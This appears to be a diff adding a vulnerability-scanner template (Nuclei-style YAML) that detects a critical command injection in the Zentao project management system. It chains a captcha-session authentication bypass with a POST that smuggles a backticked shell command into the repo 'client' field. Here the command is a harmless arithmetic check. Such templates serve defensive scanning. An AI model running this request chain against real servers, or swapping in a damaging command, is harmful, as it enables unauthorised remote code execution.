@@ -1,0 +1,77 @@
+id: zentao-command-injection
+info:
+  name: Zentao Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Zentao project development and management system is vulnerable to a command injection vulnerability. An attacker can exploit this to execute arbitrary commands on the server.
+  reference:
+    - https://mp.weixin.qq.com/s/fSZdbujtmgTS-CPC7UebVQ
+  classification:
+    cvss-score: 9.2
+    cwe-id: CWE-77
+variables:
+  rand1: "{{rand_int(100000, 200000)}}"
+  rand2: "{{rand_int(10000, 20000)}}"
+  windows_payload: "set /A {{rand1}} - {{rand2}}"
+  linux_payload: "expr {{rand1}} - {{rand2}}"
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+http:
+  - raw:
+      - |
+        GET /misc-captcha-user.html HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /index.php?m=misc&f=captcha&sessionVar=user HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /repo-create.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
+        Referer: {{BaseURL}}/repo-edit-1-0.html
+
+        product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /repo-edit-10000-10000.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
+        Referer: {{BaseURL}}/repo-edit-1-0.html
+
+        SCM=Subversion&client=`{{windows_payload}}`
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "{{to_number(rand1) - to_number(rand2)}}"
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "{\\\"client\\\":.*?}"
+        part: body
+      - type: regex
+        regex:
+          - "{{to_number(rand1) - to_number(rand2)}}"
+        part: body
